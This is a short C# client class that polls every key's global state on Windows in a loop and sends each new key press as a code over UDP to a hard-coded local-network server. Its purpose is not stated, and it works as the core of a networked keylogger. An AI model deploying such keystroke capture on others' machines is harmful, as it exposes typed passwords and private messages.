using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

public class ClientUDP
{
    // Constants for keys to ignore (e.g., keys with virtual key codes 17 and 16)
    private const int VK_IGNORE1 = 0x11; // VK_CONTROL
    private const int VK_IGNORE2 = 0x10; // VK_SHIFT

    // Boolean array to track key states
    private static bool[] keyStates = new bool[256];

    public void Start()
    {
        UdpClient? udpClient = null;

        try
        {
            // Connect to the server
            string serverIpAddress = "192.168.178.13"; // Replace with the actual IP address of the server
            int serverPort = 12345; // Use the same port as in the server

            udpClient = new UdpClient();
            IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(serverIpAddress), serverPort);

            while (true)
            {
                // Check the state of each key and mouse button
                for (int keyCode = 1; keyCode <= 255; keyCode++)
                {
                    bool keyState = (Win32Helper.GetAsyncKeyState(keyCode) & 0x8000) != 0;

                    if (!keyStates[keyCode] && keyState && keyCode != VK_IGNORE1 && keyCode != VK_IGNORE2)
                    {
                        // Print the key press event (excluding ignored keys)
                        Console.WriteLine($"Key pressed: {keyCode}");
                        string message = $"{keyCode}";
                        byte[] data = Encoding.ASCII.GetBytes(message);
                        udpClient.Send(data, data.Length, serverEndPoint);
                    }

                    // Update key state
                    keyStates[keyCode] = keyState;
                }

                // Add a small delay to avoid high CPU usage
                System.Threading.Thread.Sleep(10);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
        finally
        {
            // Clean up resources in the finally block
            udpClient?.Close();
        }
    }
}